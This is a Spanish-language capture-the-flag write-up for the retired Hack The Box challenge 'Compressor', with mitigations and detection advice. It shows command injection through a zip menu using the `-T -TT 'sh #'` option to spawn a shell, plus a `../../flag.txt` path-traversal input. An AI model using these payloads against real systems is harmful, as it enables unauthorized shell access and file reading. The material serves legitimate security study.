---
challenge: Compressor
type: Misc
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [misc, command-injection, gtfobins, zip, restricted-shell]
---

# Compressor — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

Una interfaz de menú permite crear archivos y comprimirlos con `zip`. Las opciones del comando se pasan sin filtrar; el truco de GTFOBins `-T -TT 'sh #'` convierte `zip` en una shell. Desde ella se lee la flag fuera del directorio de trabajo.

## Enunciado y superficie

- Misc, Very Easy, retirado.
- Se entrega una instancia remota por TCP.
- El menú ofrece crear, listar, leer, comprimir, cambiar de directorio y limpiar.

```bash
nc <IP> <PORT>
```

## Reconocimiento

- El menú pide un componente (`Head`, `Torso`, `Hands`, `Legs`) y trabaja en un directorio aleatorio.
- La opción de comprimir ejecuta `zip <name>.zip <name> <options>`.
- La opción de leer ejecuta `cat ./<name>`.
- El usuario es `ctf`; el objetivo está en `flag.txt`, fuera del subdirectorio.

## Análisis del código

La entrada de opciones se concatena al comando sin escape. `zip` permite ejecutar un comando mediante las opciones de prueba (`-T` y `-TT`). La opción de lectura también es vulnerable a path traversal y a inyección con `;`.

```bash
# Crear un artefacto primero.
printf 'x' > artifact
zip artifact.zip artifact -T -TT 'sh #'
```

## Explicación del fallo

`zip` interpreta `-TT <command>` y ejecuta el comando para probar el archivo. Si el comando es `sh`, se obtiene una shell interactiva. El menú no valida que las opciones sean únicamente flags de compresión.

## Reproducción local

```bash
mkdir -p /tmp/compressor/Head
cd /tmp/compressor/Head
printf 'x' > artifact
zip artifact.zip artifact -T -TT 'sh #'
```

- La shell se abre en el directorio actual.
- `cd ../..` permite salir del componente.

## Explotación

1. Elegir un componente.
2. Crear un artefacto con cualquier contenido.
3. Elegir comprimir.
4. Introducir el nombre del zip, el nombre del artefacto y `-T -TT 'sh #'`.
5. En la shell, buscar la flag.

```text
Insert <name>.zip: artifact
Insert <name>: artifact
Insert <options>: -T -TT 'sh #'
```

```bash
cd ../..
ls
cat flag.txt
```

La flag se redacta. La opción de lectura también permite `../../flag.txt` si el filtro no se aplica.

## Evidencia

- Menú y opciones introducidas.
- `whoami` y `pwd` dentro de la shell.
- Flag redactada.

## Lecciones aprendidas

- Un menú que construye comandos con entrada del usuario es una inyección.
- `zip` tiene una primitiva de ejecución documentada en GTFOBins.
- Restringir el binario no basta si se permiten opciones arbitrarias.

## Mitigaciones y detección

- No pasar opciones controladas por el usuario a `zip`.
- Usar una lista de opciones permitidas y ejecutar sin shell.
- Encapsular la compresión en una función con rutas normalizadas.
- Alertar de procesos `zip` con `-TT`, shells hijas y lecturas fuera del directorio de trabajo.

## Referencias

- <https://www.hackthebox.com/challenges/Compressor>
- <https://gtfobins.github.io/gtfobins/zip/>
- <https://owasp.org/www-community/attacks/Command_Injection>
- <https://attack.mitre.org/techniques/T1059/004/>
